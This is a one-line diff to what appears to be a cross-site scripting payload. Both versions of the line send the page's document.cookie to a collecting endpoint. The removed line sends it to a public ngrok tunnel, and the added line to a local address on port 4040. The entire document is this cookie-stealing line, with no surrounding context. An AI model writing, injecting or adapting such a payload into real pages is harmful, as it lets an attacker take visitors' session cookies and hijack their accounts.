@@ -1,1 +1,1 @@
-fetch('https://chief-supremacy-citrus.ngrok-free.dev?c=' + document.cookie)
+fetch('http://127.0.0.1:4040/?c=' + document.cookie)
